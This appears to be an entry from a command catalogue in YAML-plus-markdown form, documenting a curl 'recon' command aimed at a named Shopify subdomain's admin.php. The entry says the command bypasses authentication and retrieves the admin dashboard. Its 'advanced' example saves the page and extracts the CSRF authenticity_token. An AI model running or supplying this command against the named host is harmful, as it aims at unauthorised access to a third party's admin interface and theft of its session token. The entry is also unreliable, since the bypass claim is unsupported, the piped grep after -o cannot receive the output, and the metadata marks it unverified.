---
id: cmd-uuid-001
data: 'curl -s https://datastories.shopify.com/admin.php'
tags:
  - web
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.874Z'
verified: false
validated: true
submitted: true
---
# curl-fetch-admin-page

## Command

```bash
curl -s https://datastories.shopify.com/admin.php
```

## Description

This command uses curl to silently fetch the content of the modified admin endpoint on a Shopify subdomain, bypassing authentication to retrieve admin dashboard HTML.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode, suppresses progress meter | Yes |
| URL | Target URL with .php appended (e.g., https://datastories.shopify.com/admin.php) | Yes |

## Examples

### Basic Usage

```bash
curl -s https://datastories.shopify.com/admin.php
```

### Advanced Usage

```bash
curl -s -o admin.html https://datastories.shopify.com/admin.php | grep authenticity_token
```

> Saves output to file and extracts CSRF token.

## Expected Output

HTML content of the admin dashboard, including administrative UI elements and the authenticity_token in meta tags, without any authentication redirect.

## Related

- [[Related Procedure]]
